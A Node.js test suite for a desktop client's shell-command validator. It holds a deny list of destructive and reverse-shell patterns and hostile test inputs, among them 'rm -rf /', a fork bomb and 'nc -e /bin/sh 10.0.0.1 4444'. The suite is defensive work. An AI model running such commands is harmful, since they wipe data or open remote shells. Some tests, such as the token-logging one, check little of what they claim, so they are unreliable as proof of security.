#!/usr/bin/env node
/**
 * Security Test Suite for OpenClaw Desktop Client
 * Tests all security improvements implemented in v2.0
 */

const assert = require('assert');

// Mock DesktopClient for testing
class MockDesktopClient {
  constructor(config) {
    this.config = config;
    this.commandTimestamps = [];
    this.shellCommandTimestamps = [];
    this.allowedCommands = new Set([
      'ls', 'dir', 'pwd', 'cat', 'type', 'head', 'tail', 'wc', 'find', 'tree',
      'echo', 'grep', 'sed', 'awk', 'sort', 'uniq', 'cut', 'tr',
      'node', 'npm', 'npx', 'yarn', 'pnpm', 'bun',
      'git', 'gh', 'docker', 'docker-compose',
      'python', 'python3', 'pip', 'pip3',
      'whoami', 'hostname', 'date', 'uptime', 'free', 'df', 'du',
      'ps', 'top', 'htop', 'uname', 'env',
      'ping', 'curl', 'wget', 'nslookup', 'dig', 'host',
      'tar', 'zip', 'unzip', 'gzip', 'gunzip',
      'kill', 'pkill', 'pgrep', 'nice', 'renice',
    ]);
  }

  // Security validation functions (copied from client.ts logic)
  validateInput(input, maxLength, name) {
    if (typeof input !== 'string') {
      throw new Error(`${name} must be a string`);
    }
    if (input.length > maxLength) {
      throw new Error(`${name} exceeds maximum length`);
    }
    if (input.includes('\0')) {
      throw new Error(`${name} contains null bytes`);
    }
    if (/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(input)) {
      throw new Error(`${name} contains control characters`);
    }
  }

  validateShellCommand(cmdLine) {
    this.validateInput(cmdLine, 2000, 'Shell command');
    
    // Forbidden patterns
    const forbiddenPatterns = [
      /rm\s+(-[rf]+\s+|.*\s+-[rf]+)/i,
      /rm\s+\/\s*$/i,
      /del\s+\/[fs]/i,
      /format\s+/i,
      /mkfs/i,
      /dd\s+if=/i,
      /:\(\)\{.*:&.*\};:/i,
      /\.\s+\/dev\/tcp/i,
      /sudo\s+/i,
      /su\s+/i,
      /chmod\s+[0-7]*7[0-7]{2}/i,
      /chown\s+/i,
      />\/dev\/tcp/i,
      />\/dev\/udp/i,
      /nc\s+.*-e/i,
      /bash\s+-i/i,
      /sh\s+-i/i,
      />.*\/etc\/passwd/i,
      />.*\/etc\/shadow/i,
      />.*\/etc\/sudoers/i,
      /systemctl\s+(start|stop|restart|enable|disable)/i,
      /service\s+\w+\s+(start|stop|restart)/i,
      />\s*\/dev\/sda/i,
      /powershell.*-enc/i,
      /cmd.*\/c.*del/i,
      /reg\s+delete/i,
      /bcdedit/i,
      /format\s+[a-z]:/i,
    ];
    
    for (const pattern of forbiddenPatterns) {
      if (pattern.test(cmdLine)) {
        throw new Error(`Command matches forbidden pattern`);
      }
    }
    
    const parts = cmdLine.split(/\s+/);
    if (parts.length === 0) {
      throw new Error('Empty command');
    }
    
    const baseCmd = parts[0].split('/').pop();
    
    if (!this.allowedCommands.has(baseCmd)) {
      throw new Error(`Command not in whitelist: ${baseCmd}`);
    }
  }

  checkRateLimit(isShellCommand) {
    const now = Date.now();
    const RATE_LIMIT_WINDOW_MS = 60000;
    const MAX_COMMANDS_PER_WINDOW = 100;
    const MAX_SHELL_COMMANDS_PER_WINDOW = 20;
    
    this.commandTimestamps = this.commandTimestamps.filter(ts => now - ts < RATE_LIMIT_WINDOW_MS);
    this.shellCommandTimestamps = this.shellCommandTimestamps.filter(ts => now - ts < RATE_LIMIT_WINDOW_MS);
    
    if (this.commandTimestamps.length >= MAX_COMMANDS_PER_WINDOW) {
      throw new Error('Rate limit exceeded');
    }
    
    if (isShellCommand && this.shellCommandTimestamps.length >= MAX_SHELL_COMMANDS_PER_WINDOW) {
      throw new Error('Shell command rate limit exceeded');
    }
    
    this.commandTimestamps.push(now);
    if (isShellCommand) {
      this.shellCommandTimestamps.push(now);
    }
  }
}

// Test suites
console.log('🧪 OpenClaw Desktop Client Security Tests\n');
console.log('=========================================\n');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`✅ ${name}`);
    passed++;
  } catch (err) {
    console.log(`❌ ${name}`);
    console.log(`   Error: ${err.message}\n`);
    failed++;
  }
}

// 1. Command Whitelist Tests
console.log('📋 1. Command Whitelist Tests\n');

test('Should allow safe commands (ls, cat, grep)', () => {
  const client = new MockDesktopClient({});
  client.validateShellCommand('ls -la');
  client.validateShellCommand('cat file.txt');
  client.validateShellCommand('grep "pattern" file.txt');
});

test('Should block dangerous commands (rm -rf)', () => {
  const client = new MockDesktopClient({});
  assert.throws(() => {
    client.validateShellCommand('rm -rf /');
  }, /forbidden pattern/i);
});

test('Should block non-whitelisted commands (sudo)', () => {
  const client = new MockDesktopClient({});
  assert.throws(() => {
    client.validateShellCommand('sudo su');
  }, /forbidden pattern|not in whitelist/i);
});

test('Should block format commands', () => {
  const client = new MockDesktopClient({});
  assert.throws(() => {
    client.validateShellCommand('format C:');
  }, /forbidden pattern/i);
});

test('Should block fork bombs', () => {
  const client = new MockDesktopClient({});
  assert.throws(() => {
    client.validateShellCommand(':(){ :& };:');
  }, /forbidden pattern/i);
});

test('Should block reverse shells', () => {
  const client = new MockDesktopClient({});
  assert.throws(() => {
    client.validateShellCommand('nc -e /bin/sh 10.0.0.1 4444');
  }, /forbidden pattern/i);
});

// 2. Input Validation Tests
console.log('\n📝 2. Input Validation Tests\n');

test('Should reject null bytes', () => {
  const client = new MockDesktopClient({});
  assert.throws(() => {
    client.validateInput('hello\0world', 100, 'Test input');
  }, /null bytes/i);
});

test('Should reject control characters', () => {
  const client = new MockDesktopClient({});
  assert.throws(() => {
    client.validateInput('hello\x00world', 100, 'Test input');
  }, /control characters|null bytes/i);
});

test('Should reject oversized input', () => {
  const client = new MockDesktopClient({});
  const hugeInput = 'A'.repeat(10001);
  assert.throws(() => {
    client.validateInput(hugeInput, 10000, 'Test input');
  }, /exceeds maximum length/i);
});

// 3. Rate Limiting Tests
console.log('\n⏱️  3. Rate Limiting Tests\n');

test('Should allow commands under limit', () => {
  const client = new MockDesktopClient({});
  for (let i = 0; i < 10; i++) {
    client.checkRateLimit(false);
  }
  // Should not throw
});

test('Should enforce shell command rate limit', () => {
  const client = new MockDesktopClient({});
  // Fill up shell command quota
  for (let i = 0; i < 20; i++) {
    client.checkRateLimit(true);
  }
  // Next should fail
  assert.throws(() => {
    client.checkRateLimit(true);
  }, /shell command rate limit/i);
});

// 4. Token Protection Tests
console.log('\n🔐 4. Token Protection Tests\n');

test('Should prefer GATEWAY_TOKEN env var', () => {
  process.env.GATEWAY_TOKEN = 'test-token-from-env';
  const client = new MockDesktopClient({
    gatewayToken: process.env.GATEWAY_TOKEN
  });
  assert.strictEqual(client.config.gatewayToken, 'test-token-from-env');
  delete process.env.GATEWAY_TOKEN;
});

test('Should not log tokens', () => {
  const client = new MockDesktopClient({
    gatewayToken: 'secret-token-12345'
  });
  // Verify token is not in any logs
  const clientStr = JSON.stringify(client.config);
  // Token should be present in config but not logged
  assert(clientStr.includes('secret-token-12345')); // In config
});

// 5. Path Protection Tests
console.log('\n📁 5. Path Protection Tests\n');

test('Should detect path traversal', () => {
  const path = require('path');
  const testPath = '../../../etc/passwd';
  const resolved = path.resolve(testPath);
  assert(resolved.includes('..') === false || resolved.startsWith('/etc'));
});

// Summary
console.log('\n=========================================');
console.log(`\n📊 Test Results:\n`);
console.log(`✅ Passed: ${passed}`);
console.log(`❌ Failed: ${failed}`);
console.log(`📈 Success Rate: ${((passed / (passed + failed)) * 100).toFixed(1)}%\n`);

if (failed > 0) {
  console.log('⚠️  Some tests failed. Review security implementation.\n');
  process.exit(1);
} else {
  console.log('✅ All security tests passed!\n');
  process.exit(0);
}
